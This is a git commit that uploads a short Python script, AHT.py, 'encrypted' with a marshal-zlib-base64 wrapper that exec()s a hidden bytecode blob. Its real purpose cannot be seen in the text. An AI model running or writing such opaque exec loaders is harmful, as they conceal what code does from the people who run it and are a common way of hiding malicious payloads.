d941477e69a69a2451321e7de6d05d540b9aeba3
Ahmed-Altorky-Android <46605784+Ahmed-Altorky-Android@users.noreply.github.com>
2020-02-29 14:10:17 +0200

    Add files via upload

---
+++ AHT.py
@@ -0,0 +1,4 @@
+#Encrypt by Sumarr ID
+#Gitlab : Https://gitlab.com/Sumarr-ID
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJxFTj0LwjAUfKkiCupv6FgE28FJEbHg4uLSzU2bQKvNB8kLNbM/XF+k4PHueAd3cDUMSIhHoluRcDoGHcAVQAA8GPAE3gzYYEY/Q5EqG1O8/RAubksvCiv9a62NUGmDaNyuKPq+z4P26O8ir7Us6qJspOBlh9o+Q6m41S13S2qbgI1WmzRvVW5CFjdhFO1wErcFh0Jmce5f3Iyk8vJmbXo+4ZTcXmruO3GIVRcHzpMF+wJ8jzSu"))))
